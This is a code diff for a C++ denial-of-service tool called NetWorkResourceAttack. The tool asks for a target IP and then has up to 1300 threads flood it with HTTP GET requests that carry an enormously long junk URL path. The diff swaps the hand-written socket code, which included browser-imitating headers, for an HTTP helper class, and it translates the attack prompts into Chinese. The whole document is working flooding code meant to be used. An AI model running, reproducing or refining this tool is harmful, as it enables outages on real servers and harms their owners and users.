@@ -7,6 +7,8 @@
 #include <arpa/inet.h>
 #include <cstring>
 #include "EasyLib.cpp"
+#include "HttpRequests_Socket.cpp"
+#include "HttpRequests.cpp"
 
 using namespace std;
 
@@ -18,6 +20,7 @@ private:
     int thread = 0;
     bool isBackup = false;
     int attack_number = 0;
+    int port = 80;
 public:
     NetWorkResourceAttack() = default;
     void run_threads(int thread) {
@@ -32,58 +35,24 @@ public:
 
     void attack(int i) {
         stringstream ss;
+        ss << target;
         for (int a = 0 ; a < INT16_MAX ; a++) {
             ss << "/128318239012890312803128093812903812903812908129038109812903812938120938120938120938129038209183012983901283290";
         }
+        auto* hr = new HttpRequests(ss.str());
+
         for (int j = 0 ; j < number ; j++) {
-            try {
-                int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-                if (sockfd < 0) {
-                    perror("socket failed");
-                    return;
-                }
-                struct sockaddr_in server_addr{};
-                server_addr.sin_family = AF_INET;
-                server_addr.sin_port = htons(80);
-                inet_pton(AF_INET, target.c_str(), &server_addr.sin_addr);
-                if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-                    perror("connect failed");
-                    return;
-                }
-                const string a = "GET " + ss.str() + " HTTP/1.1\n"
-                                                     "Host: www.baidu.com\n"
-                                                     "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0\n"
-                                                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n"
-                                                     "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n"
-                                                     "Accept-Encoding: gzip, deflate, br\n"
-                                                     "Connection: keep-alive\n"
-                                                     "Sec-Fetch-Dest: document\n"
-                                                     "Sec-Fetch-Mode: navigate\n"
-                                                     "Sec-Fetch-Site: none\n"
-                                                     "Sec-Fetch-User: ?1";
-                const char* hello = a.c_str();
-                send(sockfd, hello, strlen(hello), 0);
-                attack_number += 1;
-                if (number > 100 && attack_number % 10000 == 0) {
-                    std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
-                }
-                if (number < 100){
-                    std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
-                }
-                close(sockfd);
-            }catch (const std::exception& e) {
-                if (e.what() == "socket failed: Too many open files") {
-                    continue;
-                }
-            }
+            hr-> GetRequest();
+            attack_number += 1;
+            std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
         }
     }
 
     void Console() {
 
-        target = input("Input Your Attack Target: ");
+        target = input("输入你的攻击目标(IP): ");
         string n = input(
-                "Enter the amount of data for a single user attack: "
+                "输入单个用户的攻击量: "
         );
         if (n == "max") {
             isAlways = true;
@@ -96,7 +65,7 @@ public:
             }
         }
         try {
-            thread = stoi(input("Input all the attack user number: [1-1300] "));
+            thread = stoi(input("输入模拟的用户数量: [1-1300] "));
             if (thread > 1300 || thread < 1)
             {
                 std::cerr << "Your Input Error. Break the options.";
